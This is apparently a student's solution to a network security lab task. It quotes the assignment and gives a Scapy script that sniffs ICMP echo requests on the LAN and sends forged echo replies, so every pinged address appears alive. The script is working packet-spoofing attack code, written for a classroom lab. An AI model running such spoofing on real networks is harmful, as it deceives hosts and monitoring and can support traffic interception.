# Task 2.3 You need two machines on the same LAN. From machine A, you ping an IP X. This will generate an  ICMP echo request packet. If X is alive, the ping program will receive an echo reply, and print out the  esponse. Your sniff-and-then-spoof program runs on the attacker machine, which monitors the LAN through packet sniffing. Whenever it sees an ICMP echo request, regardless of what the target IPaddress is, your program should immediately send out an echo reply using the packet spoofing technique. Therefore,  regardless of whether machine X is alive or not, the ping program will always receive a reply, indicating that X is alive

from scapy.all import *

def spoof_pkt(pkt):
    if ICMP in pkt and pkt[ICMP].type == 8:
        print("Original packet")
        print("SRc IP : " + pkt[IP].src )
        print("Dst IP : " + pkt[IP].dst )

        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl = pkt[IP].ihl, ttl = 99)

        icmp = ICMP(type=0, id=pkt[ICMP].id, seq =pkt[ICMP].seq)
        data = pkt[Raw].load
        newpkt = ip/icmp/data

        print("Spoofed packet")
        print("Src IP : " + newpkt[IP].src )
        print("Dst IP : " + newpkt[IP].dst )

        send(newpkt, verbose=0)

pkt = sniff(iface='br-19cac0a40c85', filter='icmp', prn = spoof_pkt)
